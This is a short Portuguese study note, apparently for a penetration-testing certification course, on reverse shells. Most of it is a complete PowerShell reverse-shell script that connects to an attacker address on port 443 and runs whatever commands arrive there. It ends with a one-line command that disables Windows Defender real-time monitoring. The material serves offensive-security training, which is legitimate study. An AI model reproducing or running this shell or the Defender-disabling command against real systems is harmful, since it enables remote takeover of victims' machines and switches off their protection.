> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/shells-and-payloads/reverse-shells.md).

# Reverse Shells

Com um `reverse shell`, a caixa de ataque terá um ouvinte em execução, e o alvo precisará iniciar a conexão.

* `Powershell`one-liner usado para conectar de volta a um ouvinte que foi iniciado em uma caixa de ataque

{% code lineNumbers="true" %}

```powershell
try {
    $client = New-Object System.Net.Sockets.TCPClient('10.10.15.221',443)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | % {0}
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        try {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        } catch {
            # Handle any errors that occur during command execution
            $errorMsg = $_.Exception.Message
            $errorBytes = ([text.encoding]::ASCII).GetBytes('Error: ' + $errorMsg + 'PS ' + (pwd).Path + '> ')
            $stream.Write($errorBytes, 0, $errorBytes.Length)
            $stream.Flush()
        }
    }
} catch {
    # Handle any errors that occur during the connection setup
    Write-Host "Error: $($_.Exception.Message)"
} finally {
    $client.Close()
}

```

{% endcode %}

* Comando Powershell usado para desabilitar o monitoramento em tempo real em`Windows Defender`

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true	
```
